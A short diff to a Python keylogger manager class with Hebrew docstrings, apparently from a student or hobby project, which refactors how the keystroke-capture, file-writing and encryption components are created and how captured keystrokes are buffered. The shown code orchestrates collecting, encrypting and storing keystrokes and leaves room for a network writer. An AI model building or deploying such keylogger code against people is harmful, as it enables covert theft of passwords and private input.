@@ -1,23 +1,27 @@
 import time
 import socket
 from datetime import datetime
+import KeyLoggerService as ks
+import file_writer as fw
+import Encryptor as enc
+
 
 
 class KeyLoggerManager:
-    def __init__(self, keylogger_service, file_writer, encryptor, network_writer=None, interval=5):
-        self.keylogger_service = keylogger_service
-        self.file_writer = file_writer
-        self.encryptor = encryptor
-        self.network_writer = network_writer
+    def __init__(self, interval=5):
+        self.keylogger_service = ks.KeyLoggerService()
+        self.file_writer = fw.FileWriter()
+        self.encryptor = enc.Encryptor()
+        self.network_writer = None
         self.interval = interval
         self.buffer = []
-        self.running = True
+        self.running = False
 
     def collect_keystrokes(self):
         """אוספת הקשות מה-KeyLoggerService ומאגדת ל-Buffer"""
         keystrokes = self.keylogger_service.get_logged_keys()
         if keystrokes:
-            self.buffer.append(keystrokes)
+            self.buffer += keystrokes
 
     def process_and_store_data(self):
         """ מעבדת את הנתונים, מוסיפה חותמת זמן, מצפינה ושומרת"""
